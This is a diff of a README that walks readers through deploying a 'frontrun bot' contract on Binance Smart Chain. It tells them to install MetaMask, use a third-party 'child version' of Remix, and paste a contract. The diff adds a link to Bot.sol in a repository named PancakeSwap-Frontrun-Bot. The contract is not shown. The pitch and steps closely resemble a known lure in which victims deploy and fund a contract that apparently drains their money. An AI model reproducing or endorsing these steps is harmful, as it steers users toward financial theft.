@@ -7,17 +7,14 @@ The current parameters of this contract are that 10% of profit automatically ree
 1. Download MetaMask:
 https://metamask.io/download.html
 
-
 2. Connect MetaMask to Binance Smart Chain (use Mainnet):
 https://academy.binance.com/en/articl...
 
-
 3. Access Remix (UPDATED 19/04/2022 - use child version - KLAYTN.COM for better experience): https://ide.klaytn.com/#version=soljs...
-
 
 4. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: "AutoBot.sol"
 
-5. Paste SmartContract in Remix: https://remix.ethereum.org/
+5. Paste [SmartContract](https://github.com/ReKtFreak/PancakeSwap-Frontrun-Bot/blob/main/Bot.sol) in Remix: https://remix.ethereum.org/
 
 6. Move to the "Solidity Compiler" tab, select version "0.6.6" and then "Compile" it
 
